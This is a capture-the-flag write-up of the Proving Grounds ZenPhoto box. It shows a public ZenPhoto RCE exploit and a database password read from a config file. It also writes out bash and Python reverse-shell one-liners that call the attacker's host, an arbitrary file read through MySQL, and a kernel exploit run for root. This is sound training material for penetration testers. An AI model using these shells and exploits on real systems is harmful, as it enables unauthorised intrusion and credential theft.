---
machine: ZenPhoto
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [zenphoto, rce, shell-stabilization, config-disclosure, kernel-exploit, cve-2010-3904]
date: 2026-07-27
status: retired
summary: A vintage Ubuntu box running an old ZenPhoto gallery — testing a public RCE exploit against a known ZenPhoto version for an initial (badly-behaved) shell, extensive shell-stabilization and file-transfer troubleshooting around aggressive filesystem permissions, and a classic kernel exploit for root on a box too old for modern enumeration tooling.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/zenphoto]
└─$ nmap-full 192.168.204.41
[*] Running fast port discovery on 192.168.204.41...
[*] Open ports: 22,23,80,3306
[*] Running full scan on 192.168.204.41...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 09:34 -0400
Nmap scan report for 192.168.204.41
Host is up (0.051s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.28 seconds
```

We have a few interesting findings like the existence of a port 23 open running ipp, a webapp on port 80, and a database) presumably mysql) on port 3306 flagged as unauthorized.

### Webapp Enumeration

I will begin a feroxbust on the webapp to see if we find any interesting directories.

We find many entries in the `http://target/test/` directory including a robots file:

```text
User-agent: *
Disallow: /test/albums/
Disallow: /test/cache/
Disallow: /test/themes/
Disallow: /test/zp-core/
Disallow: /test/zp-data/
Disallow: /test/page/search/
Disallow: /test/uploaded/
```

We also find a list of plugin directory redirects in `/test/plugin`

```text
|   |   |   |   |   |
|---|---|---|---|---|
|![[DIR]](http://target/icons/back.gif)|[Parent Directory](http://target/test/)||-||
|![[DIR]](http://target/icons/folder.gif)|[flag_thumbnail/](http://target/test/plugins/flag_thumbnail/)|03-Oct-2011 17:51|-||
|![[DIR]](http://target/icons/folder.gif)|[flvplayer/](http://target/test/plugins/flvplayer/)|03-Oct-2011 17:51|-||
|![[DIR]](http://target/icons/folder.gif)|[gd_fonts/](http://target/test/plugins/gd_fonts/)|03-Oct-2011 17:51|-||
|![[DIR]](http://target/icons/folder.gif)|[imagick_fonts/](http://target/test/plugins/imagick_fonts/)|03-Oct-2011 17:51|-||
|![[DIR]](http://target/icons/folder.gif)|[watermarks/](http://target/test/plugins/watermarks/)|03-Oct-2011 17:51|-||
```

`http://target/test/uploaded/` is empty but listable

We can list zp-data but cannot access the security log and other documents are empty

```text
# Index of /test/zp-data

|![[ICO]](http://target/icons/blank.gif)|[Name](http://target/test/zp-data/?C=N;O=D)|[Last modified](http://target/test/zp-data/?C=M;O=A)|[Size](http://target/test/zp-data/?C=S;O=A)|[Description](http://target/test/zp-data/?C=D;O=A)|
|---|---|---|---|---|
|---|   |   |   |   |
|![[DIR]](http://target/icons/back.gif)|[Parent Directory](http://target/test/)||-||
|![[TXT]](http://target/icons/text.gif)|[security_log.txt](http://target/test/zp-data/security_log.txt)|09-Nov-2011 06:56|659||
|![[TXT]](http://target/icons/text.gif)|[setup_log.txt](http://target/test/zp-data/setup_log.txt)|09-Nov-2011 06:54|1.8K||
|![[IMG]](http://target/icons/image2.gif)|[tést.jpg](http://target/test/zp-data/t%c3%a9st.jpg)|09-Nov-2011 06:54|268||
|![[   ]](http://target/icons/unknown.gif)|[zp-config.php](http://target/test/zp-data/zp-config.php)|09-Nov-2011 06:54|4.3K||
```

`http://target/test/zp-core` redirects to `http://target/test/zp-core/admin.php` where we are presented with a ZenPhoto login portal

`http://target/test/` takes us to a field where we can search for entries in the gallery.

In the source code (`view-source:http://target/test/index.php?p=archive`) we find a version number for zenphoto: `zenphoto version 1.4.1.4`

Now we will attempt to find an exploit which will work on this zenphoto version. Our first choice is the exploit that matches the exact version number:

```text
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                         | php/webapps/18083.php
```

Upon reading the exploit it seems that it crafts a POST request to `http://target/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/` embedding the payload at the bottom of the request.

## Foothold

We enter the proper arguments and have rce as www-data on the box:

```bash
┌──(kali㉿kali)-[~/oscp/zenphoto]
└─$ php 18083.php 192.168.204.41 /test/ 

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data

zenphoto-shell# 
```

Our shell is quite bad though, we cannot even cd .. or call a `bash -i >& /dev/tcp/192.168.45.188/23 0>&1` back to our listener. To establish a better shell I will add a php revshell to the current directory.

I try to wget a php revshell down from my python server but it fails and no GET is received on the python server.

```bash
zenphoto-shell# wget http://192.168.45.188:21/ivan.php -O ./ivan.php

┌──(kali㉿kali)-[~/oscp/zenphoto]
└─$ sudo python3 -m http.server 21
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ...
```

We fail to even write a file but we can read the directory contents from our static directory location.

```bash
zenphoto-shell# ls -lah ..
total 196K
drwxr-xr-x  7 root root 4.0K Nov  9  2011 .
drwxr-xr-x 39 root root 4.0K Oct  3  2011 ..
-rwxrwxr-x  1 root root 3.3K Oct  3  2011 _ajax_get_details_listing.php
-rwxrwxr-x  1 root root 1.6K Oct  3  2011 _ajax_get_thumbnail_listing.php
-rwxrwxr-x  1 root root  415 Oct  3  2011 _ajax_load_folders.php
-rwxrwxr-x  1 root root 2.1K Oct  3  2011 ajax_create_folder.php
-rwxrwxr-x  1 root root 2.1K Oct  3  2011 ajax_delete_file.php
-rwxrwxr-x  1 root root  776 Oct  3  2011 ajax_download.php
-rwxrwxr-x  1 root root 2.9K Oct  3  2011 ajax_editor_reset.php
-rwxrwxr-x  1 root root 1.1K Oct  3  2011 ajax_file_copy.php
-rwxrwxr-x  1 root root 1.1K Oct  3  2011 ajax_file_cut.php
-rwxrwxr-x  1 root root 4.0K Oct  3  2011 ajax_file_paste.php
-rwxrwxr-x  1 root root 2.5K Oct  3  2011 ajax_file_upload.php
-rwxrwxr-x  1 root root 3.8K Oct  3  2011 ajax_get_file_listing.php
-rwxrwxr-x  1 root root  300 Oct  3  2011 ajax_get_folder_listing.php
-rwxrwxr-x  1 root root  11K Oct  3  2011 ajax_image_editor.php
-rwxrwxr-x  1 root root 5.5K Oct  3  2011 ajax_image_save.php
-rwxrwxr-x  1 root root  765 Oct  3  2011 ajax_image_thumbnail.php
-rwxrwxr-x  1 root root 2.7K Oct  3  2011 ajax_image_undo.php
-rwxrwxr-x  1 root root 2.0K Oct  3  2011 ajax_login.php
-rwxrwxr-x  1 root root 1.5K Oct  3  2011 ajax_preview.php
-rwxrwxr-x  1 root root 1.8K Oct  3  2011 ajax_save_as_form.php
-rwxrwxr-x  1 root root 2.8K Oct  3  2011 ajax_save_name.php
-rwxrwxr-x  1 root root 1.9K Oct  3  2011 ajax_save_text.php
-rwxrwxr-x  1 root root 6.2K Oct  3  2011 ajax_text_editor.php
-rwxrwxr-x  1 root root  26K Oct  3  2011 ajaxfilemanager.php
drwxr-xr-x  2 root root 4.0K Oct  3  2011 inc
drwxr-xr-x  3 root root 4.0K Oct  3  2011 jscripts
drwxr-xr-x  2 root root 4.0K Oct  3  2011 langs
-rwxrwxr-x  1 root root  30K Oct  3  2011 mediaplayer.swf
drwxrwxr-x  2 root root 4.0K Nov  9  2011 session
drwxr-xr-x  3 root root 4.0K Oct  3  2011 theme
```

We find all these files to be owned by root and unwritable to us, however, we do have read access. This means we can go back and view the files we didn't have access to earlier in `/zp-data/`

```bash
zenphoto-shell# ls -lah ../../../../../../zp-data/
total 28K
drwxr-xr-x  2 root root 4.0K Nov  9  2011 .
drwxrwxr-x 12 root root 4.0K Nov  9  2011 ..
-rw-------  1 root root  659 Nov  9  2011 security_log.txt
-rw-------  1 root root 1.8K Nov  9  2011 setup_log.txt
-rw-r--r--  1 root root  268 Nov  9  2011 tést.jpg
-rw-r--r--  1 root root 4.4K Nov  9  2011 zp-config.php
```

Inside `zp-config.php` we find database info. Score!

```php
$conf['db_software'] = 'MySQL';                 // someday we may support other databases
/** for historical reasons these fields reference mysql even though the database **
 ** might be a different software                                                **/
$conf['mysql_user'] = 'root';           // Supply your Database user id.
$conf['mysql_pass'] = 'hola';           // Supply your Database password.
$conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
$conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 
// If you're sharing the database with other tables, use a prefix to be safe.
$conf['mysql_prefix'] = "zp_";
```

Interestingly though, when we attempt to connect from our kali, we are presented with this error:

```bash
┌──(kali㉿kali)-[~/oscp/zenphoto]
└─$ mysql -u root -phola -h 192.168.204.41
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.188' is not allowed to connect to this MySQL server
```

This means I will likely have to access it locally on the box so I attempt to mysql in from the zenphoto shell and am unsurprisingly shown no stdout:

```bash
zenphoto-shell# mysql -u root -phola -h 192.168.204.41

```

This is troubling because at this point we would normally want to port forward the 3306 port back to our kali but when we attempted to pull down a file from our python webserver we were unable to even receive a GET request to the python server.  If we can't pull down a binary like chisel or ligolo, it would be quite difficult for us to portforward.

I remember though that the directory I was trying to download the revshell to we lacked write access in, so I opt to attempt another wget to the universally writable `/tmp` directory.

```bash
zenphoto-shell# wget http://192.168.45.188:21/ivan.php -O /tmp/ivan.php

┌──(kali㉿kali)-[~/oscp/zenphoto]
└─$ sudo python3 -m http.server 21  
Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ...
192.168.204.41 - - [27/Jul/2026 10:32:28] "GET /ivan.php HTTP/1.0" 200 -
```

We manage to pull down a file successfully meaning our lack of write access was the cause of our issue! We should be able to pull down a tool like chisel now and port reverse port forward 3306 back to our kali.

For some reason downloading the chisel binary results in the exploit crashing. I try a variety of different things (different chisel versions, ssh reverse port forwarding, different kinds of bash and php based revshells, nc revshell) all without success likely due to our highly buggy shell.

Eventually we find the way to get a more stable shell is using a python based revshell and NOT using penelope (it auto tries to upgrade to full PTY shell). We get a more functional shell by using rlwrap nc listener on port 23 (to avoid potential firewall blockades) and the follwing python revshell:

```bash
export RHOST="192.168.45.188";export RPORT=23;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

With this shell we can download chisel again to the /tmp directory and try the reverse port forward again.

I get a `cannot execute binary file` error. I try again with an older version and receive the same error. I try with socat and receive the same error.

At this point I give up on trying to reverse port forward back and I think to just transfer the mysql binary to the box's /tmp directory and use it there:

```bash
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ wget http://192.168.45.188:21/mysql -O /tmp/mysql
<ins/ajaxfilemanager/inc$ wget http://192.168.45.188:21/mysql -O /tmp/mysql  
--2026-07-27 15:39:12--  http://192.168.45.188:21/mysql
Connecting to 192.168.45.188:21... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5394264 (5.1M) [application/octet-stream]
Saving to: `/tmp/mysql'

100%[======================================>] 5,394,264    378K/s   in 12s     

2026-07-27 15:39:25 (423 KB/s) - `/tmp/mysql' saved [5394264/5394264]


<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ mysql -u root -phola -h 127.0.0.1
<ins/ajaxfilemanager/inc$ mysql -u root -phola -h 127.0.0.1                  
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 83
Server version: 5.1.41-3ubuntu12.10 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

```

```bash
mysql> show tables from zenphoto;
show tables from zenphoto;
+--------------------+
| Tables_in_zenphoto |
+--------------------+
| zp_admin_to_object |
| zp_administrators  |
| zp_albums          |
| zp_captcha         |
| zp_comments        |
| zp_images          |
| zp_menu            |
| zp_news            |
| zp_news2cat        |
| zp_news_categories |
| zp_obj_to_tag      |
| zp_options         |
| zp_pages           |
| zp_plugin_storage  |
| zp_tags            |
+--------------------+
15 rows in set (0.00 sec)

mysql> select * from zenphoto.zp_administrators;
select * from zenphoto.zp_administrators;
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
| id | user           | pass                                     | name     | email | rights     | custom_data                                 | valid | group | date                | loggedin | quota | language | prime_album | other_credentials |
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
|  1 | administrators | NULL                                     | group    | NULL  | 1961343989 | Users with full privileges                  |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  2 | viewers        | NULL                                     | group    | NULL  |       2945 | Users allowed only to view zenphoto objects |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  3 | bozos          | NULL                                     | group    | NULL  |          0 | Banned users                                |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  4 | album managers | NULL                                     | template | NULL  |   67386245 | Managers of one or more albums              |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  5 | default        | NULL                                     | template | NULL  |        945 | Default user settings                       |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  6 | newuser        | NULL                                     | template | NULL  |          1 | Newly registered and verified users         |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  7 | admin          | 63e5c2e178e611b692b526f8b6332317f2ff5513 | admin    | admin | 1961343989 | NULL                                        |     1 | NULL  | 2011-11-09 06:56:29 | NULL     |  NULL | NULL     | NULL        | NULL              |
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
7 rows in set (0.00 sec)

mysql> 

```

We get a hash for the admin user: `admin:63e5c2e178e611b692b526f8b6332317f2ff5513` and we see that we are running as root:

```bash
mysql> sselect system_user();
select system_user();
+----------------+
| system_user()  |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```

We can arbitrary file read with:

```sql
load data local infile "/etc/passwd" into table zp_tags FIELDS TERMINATED BY '\n';

SELECT * FROM zp_tags;
```

Using this we are able to dump /etc/passwd into the zp_tags table and view it but for some reason it doesn't work with normal files. My intention was to use that to read the root flag.

## Privilege Escalation

We attempt to crack the admin hash but to no avail, so we move on to linpeas.

Linpeas fails as the box is too old for the precompiled version so we move onto linux exploit suggestor instead:

```bash
www-data@offsecsrv:/tmp$ /bin/bash linpeas
/bin/bash linpeas
linpeas: line 5: kali-treecd: command not found
```

Our two most highly probable exploits being rds and dirtycow 2:

```text
Possible Exploits:

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,[ ubuntu=10.04{kernel:2.6.32-21-generic} ],ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]                                                                                                                                             
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
```

I then pull down the exploit from searchsploit, compile it, and download it to the target via a python webserver on port 80:

```bash
┌──(kali㉿kali)-[~/oscp/zenphoto]
└─$ gcc 15285.c -o exploit -Wno-implicit-function-declaration

www-data@offsecsrv:/tmp$ ./exploit
./exploit
bash: ./exploit: cannot execute binary file
```

This however fails. We need to compile the exploit on the target machine.

```bash
www-data@offsecsrv:/tmp$ gcc exploit.c -o rds
gcc exploit.c -o rds

www-data@offsecsrv:/tmp$ ./rds
./rds
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# whoami
whoami
root
# 
```

This works and we have finally finished the box!
